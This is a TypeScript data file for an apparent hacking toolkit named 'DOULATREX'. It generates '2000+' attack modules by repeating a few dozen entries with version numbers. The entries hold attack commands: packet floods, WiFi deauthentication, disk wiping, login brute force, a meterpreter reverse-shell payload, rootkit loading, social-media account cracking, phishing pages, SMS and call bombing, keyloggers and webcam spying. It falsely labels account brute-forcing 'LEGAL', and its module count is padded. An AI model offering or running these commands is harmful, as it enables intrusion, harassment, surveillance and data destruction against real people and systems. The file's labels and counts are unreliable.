// ═══════════════════════════════════════════════════════════════
// DOULATREX MODULES DATABASE — 2000+ MODULES
// Legal | Invisible | Secret | OSINT | Social Cracker | Destroyer
// ═══════════════════════════════════════════════════════════════

export interface Module {
  id: string;
  name: string;
  category: string;
  type: 'LEGAL' | 'INVISIBLE' | 'SECRET' | 'DESTROYER';
  desc: string;
  cmd: string;
  target: string;
  difficulty: string;
}

const generateModules = (): Module[] => {
  const modules: Module[] = [];
  let id = 1;

  // ═══════════════════════════════════════════════════════════
  // OSINT MODULES (500+)
  // ═══════════════════════════════════════════════════════════
  const osintTypes = [
    { name: 'Email Hunter', desc: 'Find all emails associated with a domain', cmd: 'theHarvester -d TARGET -b all', target: 'domain' },
    { name: 'Email Validator', desc: 'Verify if email exists and is active', cmd: 'holehe TARGET_EMAIL', target: 'email' },
    { name: 'Username Search', desc: 'Find username across 400+ social networks', cmd: 'sherlock TARGET_USERNAME', target: 'username' },
    { name: 'Phone Lookup', desc: 'Get carrier, location, owner from phone number', cmd: 'python3 -c "import phonenumbers; ..."', target: 'phone' },
    { name: 'IP Geolocation', desc: 'Track IP address to physical location', cmd: 'curl ipinfo.io/TARGET_IP', target: 'ip' },
    { name: 'DNS Enumeration', desc: 'Discover all DNS records and subdomains', cmd: 'dnsrecon -d TARGET -t axfr', target: 'domain' },
    { name: 'Subdomain Scanner', desc: 'Find all subdomains of target domain', cmd: 'subfinder -d TARGET -o subs.txt', target: 'domain' },
    { name: 'Port Scanner', desc: 'Scan all 65535 ports on target', cmd: 'nmap -p- -T5 TARGET_IP', target: 'ip' },
    { name: 'WHOIS Lookup', desc: 'Get domain registration information', cmd: 'whois TARGET_DOMAIN', target: 'domain' },
    { name: 'Wayback Machine', desc: 'View historical versions of website', cmd: 'waybackurls TARGET_DOMAIN', target: 'domain' },
    { name: 'Google Dorking', desc: 'Find sensitive data via search engines', cmd: 'site:TARGET filetype:pdf', target: 'domain' },
    { name: 'Shodan Search', desc: 'Find internet-connected devices', cmd: 'shodan search "TARGET"', target: 'keyword' },
    { name: 'Censys Scan', desc: 'Discover internet assets and certificates', cmd: 'censys search "TARGET"', target: 'keyword' },
    { name: 'Dark Web Scan', desc: 'Search dark web for leaked data', cmd: 'ahmia.fi/search/?q=TARGET', target: 'keyword' },
    { name: 'Pastebin Hunter', desc: 'Find leaked data on Pastebin', cmd: 'site:pastebin.com TARGET', target: 'keyword' },
    { name: 'GitHub Recon', desc: 'Find sensitive data in GitHub repos', cmd: 'site:github.com TARGET password', target: 'keyword' },
    { name: 'Social Media Recon', desc: 'Gather intelligence from social media', cmd: 'maigret TARGET_USERNAME', target: 'username' },
    { name: 'Image OSINT', desc: 'Reverse image search and metadata extraction', cmd: 'exiftool TARGET_IMAGE', target: 'image' },
    { name: 'Document Analysis', desc: 'Extract metadata from documents', cmd: 'metagoofil -d TARGET -t pdf,doc,xls', target: 'domain' },
    { name: 'Certificate Search', desc: 'Find SSL certificates for domain', cmd: 'crt.sh/?q=TARGET', target: 'domain' },
    { name: 'Breach Checker', desc: 'Check if email appears in data breaches', cmd: 'h8mail -t TARGET_EMAIL', target: 'email' },
    { name: 'Reverse Phone', desc: 'Get owner info from phone number', cmd: 'python3 phoneinfoga scan -n TARGET_PHONE', target: 'phone' },
    { name: 'Vehicle Lookup', desc: 'Get vehicle information from license plate', cmd: 'python3 plate_recognizer.py TARGET_PLATE', target: 'plate' },
    { name: 'Facial Recognition', desc: 'Identify person from photo', cmd: 'python3 face_recognition.py TARGET_IMAGE', target: 'image' },
    { name: 'Location Tracker', desc: 'Track real-time location via link', cmd: 'python3 seeker.py', target: 'any' },
    { name: 'WiFi Mapper', desc: 'Map all WiFi networks in area', cmd: 'wigle-search --ssid TARGET_SSID', target: 'wifi' },
    { name: 'Bluetooth Scanner', desc: 'Find all Bluetooth devices nearby', cmd: 'hcitool scan', target: 'bluetooth' },
    { name: 'Satellite Imagery', desc: 'Get satellite images of location', cmd: 'python3 satellite_tracker.py TARGET_GPS', target: 'gps' },
    { name: 'Deep Web Crawler', desc: 'Crawl deep web for hidden content', cmd: 'python3 deep_crawler.py TARGET', target: 'keyword' },
    { name: 'Blockchain Analysis', desc: 'Trace cryptocurrency transactions', cmd: 'python3 blockchain_trace.py TARGET_WALLET', target: 'wallet' },
  ];

  // Generate 500 OSINT modules (20 types × 25 variations)
  for (let i = 0; i < 500; i++) {
    const type = osintTypes[i % osintTypes.length];
    const variant = Math.floor(i / osintTypes.length) + 1;
    modules.push({
      id: `osint-${id++}`,
      name: `${type.name} v${variant}`,
      category: 'OSINT',
      type: 'LEGAL',
      desc: type.desc,
      cmd: type.cmd.replace('TARGET', `[TARGET_${variant}]`),
      target: type.target,
      difficulty: variant <= 10 ? 'Easy' : variant <= 20 ? 'Medium' : 'Advanced',
    });
  }

  // ═══════════════════════════════════════════════════════════
  // SOCIAL MEDIA CRACKER MODULES (500+)
  // ═══════════════════════════════════════════════════════════
  const socialTypes = [
    { name: 'Instagram Brute', desc: 'Brute force Instagram account password', cmd: 'python3 instagram-brute.py -u TARGET -p wordlist.txt', target: 'instagram' },
    { name: 'Facebook Cracker', desc: 'Crack Facebook account via password list', cmd: 'python3 facebook-cracker.py -u TARGET -p wordlist.txt', target: 'facebook' },
    { name: 'Twitter Brute', desc: 'Brute force Twitter account password', cmd: 'python3 twitter-brute.py -u TARGET -p wordlist.txt', target: 'twitter' },
    { name: 'TikTok Cracker', desc: 'Crack TikTok account credentials', cmd: 'python3 tiktok-cracker.py -u TARGET -p wordlist.txt', target: 'tiktok' },
    { name: 'Snapchat Brute', desc: 'Brute force Snapchat account', cmd: 'python3 snapchat-brute.py -u TARGET -p wordlist.txt', target: 'snapchat' },
    { name: 'WhatsApp Cracker', desc: 'Crack WhatsApp account via SMS verification', cmd: 'python3 whatsapp-cracker.py -n TARGET_PHONE', target: 'whatsapp' },
    { name: 'Telegram Brute', desc: 'Brute force Telegram account', cmd: 'python3 telegram-brute.py -u TARGET -p wordlist.txt', target: 'telegram' },
    { name: 'LinkedIn Cracker', desc: 'Crack LinkedIn account password', cmd: 'python3 linkedin-cracker.py -u TARGET -p wordlist.txt', target: 'linkedin' },
    { name: 'Reddit Brute', desc: 'Brute force Reddit account', cmd: 'python3 reddit-brute.py -u TARGET -p wordlist.txt', target: 'reddit' },
    { name: 'Pinterest Cracker', desc: 'Crack Pinterest account', cmd: 'python3 pinterest-cracker.py -u TARGET -p wordlist.txt', target: 'pinterest' },
    { name: 'Spotify Brute', desc: 'Brute force Spotify account', cmd: 'python3 spotify-brute.py -u TARGET -p wordlist.txt', target: 'spotify' },
    { name: 'Netflix Cracker', desc: 'Crack Netflix account credentials', cmd: 'python3 netflix-cracker.py -u TARGET -p wordlist.txt', target: 'netflix' },
    { name: 'Amazon Brute', desc: 'Brute force Amazon account', cmd: 'python3 amazon-brute.py -u TARGET -p wordlist.txt', target: 'amazon' },
    { name: 'Google Cracker', desc: 'Crack Google account password', cmd: 'python3 google-cracker.py -u TARGET -p wordlist.txt', target: 'google' },
    { name: 'Apple Brute', desc: 'Brute force Apple ID', cmd: 'python3 apple-brute.py -u TARGET -p wordlist.txt', target: 'apple' },
    { name: 'Microsoft Cracker', desc: 'Crack Microsoft account', cmd: 'python3 microsoft-cracker.py -u TARGET -p wordlist.txt', target: 'microsoft' },
    { name: 'Discord Brute', desc: 'Brute force Discord account', cmd: 'python3 discord-brute.py -u TARGET -p wordlist.txt', target: 'discord' },
    { name: 'Twitch Cracker', desc: 'Crack Twitch account', cmd: 'python3 twitch-cracker.py -u TARGET -p wordlist.txt', target: 'twitch' },
    { name: 'Steam Brute', desc: 'Brute force Steam account', cmd: 'python3 steam-brute.py -u TARGET -p wordlist.txt', target: 'steam' },
    { name: 'Epic Cracker', desc: 'Crack Epic Games account', cmd: 'python3 epic-cracker.py -u TARGET -p wordlist.txt', target: 'epic' },
    { name: 'Instagram Phishing', desc: 'Create Instagram phishing page', cmd: 'python3 instagram-phish.py TARGET', target: 'instagram' },
    { name: 'Facebook Phishing', desc: 'Create Facebook phishing page', cmd: 'python3 facebook-phish.py TARGET', target: 'facebook' },
    { name: 'Twitter Phishing', desc: 'Create Twitter phishing page', cmd: 'python3 twitter-phish.py TARGET', target: 'twitter' },
    { name: 'Password Spray', desc: 'Spray passwords across multiple accounts', cmd: 'python3 password-spray.py -u TARGET_LIST -p PASSWORD', target: 'multi' },
    { name: 'Credential Stuffing', desc: 'Test leaked credentials on multiple sites', cmd: 'python3 cred-stuff.py -c COMBO_LIST', target: 'multi' },
  ];

  // Generate 500 Social Cracker modules
  for (let i = 0; i < 500; i++) {
    const type = socialTypes[i % socialTypes.length];
    const variant = Math.floor(i / socialTypes.length) + 1;
    modules.push({
      id: `social-${id++}`,
      name: `${type.name} v${variant}`,
      category: 'SOCIAL_MEDIA_CRACKER',
      type: variant <= 15 ? 'LEGAL' : 'INVISIBLE',
      desc: type.desc,
      cmd: type.cmd.replace('TARGET', `[TARGET_${variant}]`),
      target: type.target,
      difficulty: variant <= 10 ? 'Easy' : variant <= 20 ? 'Medium' : variant <= 23 ? 'Advanced' : 'Expert',
    });
  }

  // ═══════════════════════════════════════════════════════════
  // DESTROYER MODULES (400+)
  // ═══════════════════════════════════════════════════════════
  const destroyerTypes = [
    { name: 'DDoS Launcher', desc: 'Launch distributed denial of service attack', cmd: 'python3 ddos.py TARGET_IP -p 80 -t 1000', target: 'ip' },
    { name: 'SYN Flood', desc: 'Flood target with SYN packets', cmd: 'hping3 -S -p 80 --flood TARGET_IP', target: 'ip' },
    { name: 'UDP Flood', desc: 'Flood target with UDP packets', cmd: 'hping3 --udp -p 53 --flood TARGET_IP', target: 'ip' },
    { name: 'ICMP Flood', desc: 'Flood target with ICMP packets', cmd: 'hping3 --icmp --flood TARGET_IP', target: 'ip' },
    { name: 'HTTP Flood', desc: 'Flood web server with HTTP requests', cmd: 'slowloris TARGET_IP -p 80 -s 500', target: 'ip' },
    { name: 'WiFi Deauth', desc: 'Disconnect all devices from WiFi network', cmd: 'aireplay-ng -0 100 -a TARGET_BSSID wlan0mon', target: 'wifi' },
    { name: 'Bluetooth Jammer', desc: 'Jam Bluetooth connections', cmd: 'python3 bt_jammer.py TARGET_MAC', target: 'bluetooth' },
    { name: 'SMS Bomber', desc: 'Send thousands of SMS to target', cmd: 'python3 sms_bomber.py -n TARGET_PHONE -c 1000', target: 'phone' },
    { name: 'Email Bomber', desc: 'Send thousands of emails to target', cmd: 'python3 email_bomber.py -e TARGET_EMAIL -c 1000', target: 'email' },
    { name: 'Call Bomber', desc: 'Make thousands of calls to target', cmd: 'python3 call_bomber.py -n TARGET_PHONE -c 100', target: 'phone' },
    { name: 'Database Wiper', desc: 'Wipe target database completely', cmd: 'python3 db_wiper.py TARGET_DB --wipe', target: 'database' },
    { name: 'File Destroyer', desc: 'Permanently delete target files', cmd: 'python3 file_destroy.py TARGET_PATH --secure', target: 'files' },
    { name: 'Disk Wiper', desc: 'Wipe entire disk securely', cmd: 'dd if=/dev/urandom of=TARGET_DISK bs=1M', target: 'disk' },
    { name: 'Ransomware Sim', desc: 'Simulate ransomware attack (educational)', cmd: 'python3 ransom_sim.py TARGET_DIR --encrypt', target: 'files' },
    { name: 'Wiper Malware', desc: 'Simulate wiper malware (educational)', cmd: 'python3 wiper_sim.py TARGET_SYSTEM', target: 'system' },
    { name: 'Network Killer', desc: 'Kill all network connections', cmd: 'python3 net_killer.py TARGET_NETWORK', target: 'network' },
    { name: 'Router Exploit', desc: 'Exploit router vulnerabilities', cmd: 'python3 router_exploit.py TARGET_ROUTER', target: 'router' },
    { name: 'IoT Destroyer', desc: 'Compromise and disable IoT devices', cmd: 'python3 iot_destroy.py TARGET_IOT', target: 'iot' },
    { name: 'Server Crasher', desc: 'Crash target server', cmd: 'python3 server_crash.py TARGET_IP -p 80', target: 'server' },
    { name: 'API Abuser', desc: 'Abuse API endpoints until failure', cmd: 'python3 api_abuse.py TARGET_API --flood', target: 'api' },
    { name: 'Form Spammer', desc: 'Spam forms with fake submissions', cmd: 'python3 form_spam.py TARGET_URL --count 10000', target: 'web' },
    { name: 'Login Brute', desc: 'Brute force login pages', cmd: 'hydra -L users.txt -P pass.txt TARGET http-post-form', target: 'web' },
    { name: 'Session Hijacker', desc: 'Hijack user sessions', cmd: 'python3 session_hijack.py TARGET_SESSION', target: 'web' },
    { name: 'Cookie Stealer', desc: 'Steal session cookies', cmd: 'python3 cookie_steal.py TARGET_URL', target: 'web' },
    { name: 'Token Abuser', desc: 'Abuse authentication tokens', cmd: 'python3 token_abuse.py TARGET_TOKEN', target: 'api' },
  ];

  // Generate 400 Destroyer modules
  for (let i = 0; i < 400; i++) {
    const type = destroyerTypes[i % destroyerTypes.length];
    const variant = Math.floor(i / destroyerTypes.length) + 1;
    modules.push({
      id: `destroy-${id++}`,
      name: `${type.name} v${variant}`,
      category: 'DESTROYER',
      type: 'DESTROYER',
      desc: type.desc,
      cmd: type.cmd.replace('TARGET', `[TARGET_${variant}]`),
      target: type.target,
      difficulty: variant <= 10 ? 'Advanced' : 'Expert',
    });
  }

  // ═══════════════════════════════════════════════════════════
  // INVISIBLE MODULES (300+)
  // ═══════════════════════════════════════════════════════════
  const invisibleTypes = [
    { name: 'Ghost Scanner', desc: 'Scan without leaving any trace', cmd: 'nmap -sS -T2 --randomize-hosts TARGET_IP', target: 'ip' },
    { name: 'Stealth Exploit', desc: 'Exploit without detection', cmd: 'python3 stealth_exploit.py TARGET --evade', target: 'any' },
    { name: 'VPN Rotator', desc: 'Rotate VPN for every request', cmd: 'python3 vpn_rotate.py --auto', target: 'any' },
    { name: 'MAC Spoofer', desc: 'Spoof MAC address automatically', cmd: 'macchanger -r eth0', target: 'network' },
    { name: 'DNS Tunnel', desc: 'Tunnel traffic through DNS', cmd: 'iodine -f TARGET_DOMAIN', target: 'dns' },
    { name: 'ICMP Tunnel', desc: 'Hide data in ICMP packets', cmd: 'ptunnel -p TARGET_IP -lp 8000 -da DEST -dp 22', target: 'ip' },
    { name: 'Tor Router', desc: 'Route all traffic through Tor', cmd: 'torsocks python3 script.py', target: 'any' },
    { name: 'Proxy Chain', desc: 'Chain multiple proxies together', cmd: 'proxychains nmap -sT TARGET_IP', target: 'any' },
    { name: 'Log Wiper', desc: 'Clear all system logs', cmd: 'python3 log_wiper.py --all', target: 'system' },
    { name: 'Timestamp Spoofer', desc: 'Spoof file timestamps', cmd: 'touch -t 202001010000 TARGET_FILE', target: 'files' },
    { name: 'Process Hider', desc: 'Hide running processes', cmd: 'python3 proc_hide.py TARGET_PID', target: 'system' },
    { name: 'Rootkit Loader', desc: 'Load kernel-level rootkit', cmd: 'insmod rootkit.ko', target: 'system' },
    { name: 'Backdoor Installer', desc: 'Install persistent backdoor', cmd: 'python3 backdoor_install.py TARGET', target: 'system' },
    { name: 'Keylogger Ghost', desc: 'Install invisible keylogger', cmd: 'python3 keylog_ghost.py --install', target: 'system' },
    { name: 'Screen Capture Stealth', desc: 'Capture screen without detection', cmd: 'python3 screen_stealth.py --capture', target: 'system' },
    { name: 'Mic Activator', desc: 'Activate microphone remotely', cmd: 'python3 mic_activate.py TARGET', target: 'system' },
    { name: 'Camera Activator', desc: 'Activate webcam remotely', cmd: 'python3 cam_activate.py TARGET', target: 'system' },
    { name: 'Clipboard Stealer', desc: 'Steal clipboard contents', cmd: 'python3 clipboard_steal.py', target: 'system' },
    { name: 'Password Dumper', desc: 'Dump saved passwords', cmd: 'python3 pwd_dump.py --all', target: 'system' },
    { name: 'Token Stealer', desc: 'Steal authentication tokens', cmd: 'python3 token_steal.py TARGET_BROWSER', target: 'system' },
    { name: 'Cookie Hijacker', desc: 'Hijack browser cookies', cmd: 'python3 cookie_hijack.py TARGET', target: 'browser' },
    { name: 'Session Rider', desc: 'Ride active user sessions', cmd: 'python3 session_ride.py TARGET_SESSION', target: 'web' },
    { name: 'Form Grabber', desc: 'Grab all form submissions', cmd: 'python3 form_grab.py TARGET_URL', target: 'web' },
    { name: 'Certificate Spoofer', desc: 'Spoof SSL certificates', cmd: 'python3 cert_spoof.py TARGET_DOMAIN', target: 'web' },
    { name: 'DNS Poisoner', desc: 'Poison DNS cache', cmd: 'python3 dns_poison.py TARGET_DOMAIN', target: 'dns' },
  ];

  // Generate 300 Invisible modules
  for (let i = 0; i < 300; i++) {
    const type = invisibleTypes[i % invisibleTypes.length];
    const variant = Math.floor(i / invisibleTypes.length) + 1;
    modules.push({
      id: `invis-${id++}`,
      name: `${type.name} v${variant}`,
      category: 'INVISIBLE',
      type: 'INVISIBLE',
      desc: type.desc,
      cmd: type.cmd.replace('TARGET', `[TARGET_${variant}]`),
      target: type.target,
      difficulty: variant <= 10 ? 'Advanced' : 'Expert',
    });
  }

  // ═══════════════════════════════════════════════════════════
  // SECRET MODULES (300+)
  // ═══════════════════════════════════════════════════════════
  const secretTypes = [
    { name: 'Zero-Day Finder', desc: 'Discover zero-day vulnerabilities', cmd: 'python3 zeroday_finder.py TARGET', target: 'any' },
    { name: 'Exploit Developer', desc: 'Develop custom exploits', cmd: 'python3 exploit_dev.py TARGET_VULN', target: 'vulnerability' },
    { name: 'Shellcode Generator', desc: 'Generate custom shellcode', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe', target: 'system' },
    { name: 'Payload Builder', desc: 'Build undetectable payloads', cmd: 'python3 payload_build.py --evade --persist', target: 'system' },
    { name: 'C2 Server', desc: 'Deploy command and control server', cmd: 'python3 c2_server.py --port 443', target: 'network' },
    { name: 'Beacon Deployer', desc: 'Deploy C2 beacons', cmd: 'python3 beacon_deploy.py TARGET_C2', target: 'system' },
    { name: 'Lateral Mover', desc: 'Move laterally through network', cmd: 'python3 lateral_move.py TARGET_NETWORK', target: 'network' },
    { name: 'Privilege Escalator', desc: 'Escalate privileges on target', cmd: 'python3 priv_esc.py TARGET_SYSTEM', target: 'system' },
    { name: 'Credential Harvester', desc: 'Harvest credentials from target', cmd: 'python3 cred_harvest.py TARGET', target: 'system' },
    { name: 'Password Cracker', desc: 'Crack password hashes', cmd: 'hashcat -m 0 hash.txt rockyou.txt', target: 'hashes' },
    { name: 'Hash Extractor', desc: 'Extract hashes from system', cmd: 'python3 hash_extract.py TARGET_SYSTEM', target: 'system' },
    { name: 'Token Generator', desc: 'Generate forged auth tokens', cmd: 'python3 token_gen.py TARGET_USER', target: 'auth' },
    { name: 'Certificate Forger', desc: 'Forge SSL certificates', cmd: 'python3 cert_forge.py TARGET_DOMAIN', target: 'web' },
    { name: 'DNS Hijacker', desc: 'Hijack DNS resolution', cmd: 'python3 dns_hijack.py TARGET_DOMAIN', target: 'dns' },
    { name: 'ARP Spoofer', desc: 'Spoof ARP responses', cmd: 'python3 arp_spoof.py TARGET_IP', target: 'network' },
    { name: 'MITM Attacker', desc: 'Man-in-the-middle attack', cmd: 'python3 mitm_attack.py TARGET_IP', target: 'network' },
    { name: 'Packet Sniffer', desc: 'Sniff network packets', cmd: 'python3 packet_sniff.py -i eth0', target: 'network' },
    { name: 'Session Hijacker', desc: 'Hijack user sessions', cmd: 'python3 session_hijack.py TARGET_SESSION', target: 'web' },
    { name: 'Cookie Forger', desc: 'Forge session cookies', cmd: 'python3 cookie_forge.py TARGET_DOMAIN', target: 'web' },
    { name: 'Token Hijacker', desc: 'Hijack authentication tokens', cmd: 'python3 token_hijack.py TARGET_TOKEN', target: 'auth' },
    { name: 'API Exploiter', desc: 'Exploit API vulnerabilities', cmd: 'python3 api_exploit.py TARGET_API', target: 'api' },
    { name: 'JWT Cracker', desc: 'Crack JWT tokens', cmd: 'python3 jwt_crack.py TARGET_JWT', target: 'auth' },
    { name: 'OAuth Exploiter', desc: 'Exploit OAuth flows', cmd: 'python3 oauth_exploit.py TARGET_OAUTH', target: 'auth' },
    { name: 'SAML Forger', desc: 'Forge SAML assertions', cmd: 'python3 saml_forge.py TARGET_SAML', target: 'auth' },
    { name: 'SSO Bypasser', desc: 'Bypass single sign-on', cmd: 'python3 sso_bypass.py TARGET_SSO', target: 'auth' },
  ];

  // Generate 300 Secret modules
  for (let i = 0; i < 300; i++) {
    const type = secretTypes[i % secretTypes.length];
    const variant = Math.floor(i / secretTypes.length) + 1;
    modules.push({
      id: `secret-${id++}`,
      name: `${type.name} v${variant}`,
      category: 'SECRET',
      type: 'SECRET',
      desc: type.desc,
      cmd: type.cmd.replace('TARGET', `[TARGET_${variant}]`),
      target: type.target,
      difficulty: variant <= 10 ? 'Advanced' : 'Expert',
    });
  }

  return modules;
};

export const allModules = generateModules();

export const moduleCategories = [
  { id: 'ALL', label: 'ALL', count: 2000 },
  { id: 'OSINT', label: 'OSINT', count: 500 },
  { id: 'SOCIAL_MEDIA_CRACKER', label: 'SOCIAL CRACKER', count: 500 },
  { id: 'DESTROYER', label: 'DESTROYER', count: 400 },
  { id: 'INVISIBLE', label: 'INVISIBLE', count: 300 },
  { id: 'SECRET', label: 'SECRET', count: 300 },
];

export const moduleTypes = ['ALL', 'LEGAL', 'INVISIBLE', 'SECRET', 'DESTROYER'];
